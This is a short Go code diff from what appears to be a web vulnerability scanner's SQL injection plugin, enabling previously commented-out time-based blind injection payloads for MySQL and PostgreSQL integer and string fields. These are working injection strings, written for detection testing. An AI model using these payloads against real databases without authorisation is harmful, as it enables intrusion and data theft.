@@ -19,37 +19,36 @@ func (p *Plugin) initAttacks() {
 		IsTiming:    true,
 		Attack:      "(select(sleep(%d)))",
 	})
-	/*
-		// mysql int
-		p.attacks = append(p.attacks, &SQLIAttack{
-			DBTech:      browserk.DBMySQL,
-			Prefix:      "-",
-			IsTiming:    true,
-			Description: "Timing attack in integer field",
-			Attack:      "(select(sleep(%d)))",
-		})
 
-		// todo: mysql column
+	// mysql int
+	p.attacks = append(p.attacks, &SQLIAttack{
+		DBTech:      browserk.DBMySQL,
+		Prefix:      "-",
+		IsTiming:    true,
+		Description: "Timing attack in integer field",
+		Attack:      "(select(sleep(%d)))",
+	})
 
-		// postgres int
-		p.attacks = append(p.attacks, &SQLIAttack{
-			DBTech:      browserk.DBPostgres,
-			Prefix:      "-",
-			IsTiming:    true,
-			Description: "Timing attack in integer field",
-			Attack:      "((select(pg_sleep(%d))isnull)::int)",
-		})
+	// todo: mysql column
 
-		// postgres string
-		p.attacks = append(p.attacks, &SQLIAttack{
-			DBTech:      browserk.DBPostgres,
-			Prefix:      "'||",
-			Suffix:      "||'",
-			IsTiming:    true,
-			Description: "Timing attack with string concatenation",
-			Attack:      "(select(pg_sleep(%d)))",
-		})
-	*/
+	// postgres int
+	p.attacks = append(p.attacks, &SQLIAttack{
+		DBTech:      browserk.DBPostgres,
+		Prefix:      "-",
+		IsTiming:    true,
+		Description: "Timing attack in integer field",
+		Attack:      "((select(pg_sleep(%d))isnull)::int)",
+	})
+
+	// postgres string
+	p.attacks = append(p.attacks, &SQLIAttack{
+		DBTech:      browserk.DBPostgres,
+		Prefix:      "'||",
+		Suffix:      "||'",
+		IsTiming:    true,
+		Description: "Timing attack with string concatenation",
+		Attack:      "(select(pg_sleep(%d)))",
+	})
 
 	// todo: postgres column
 }
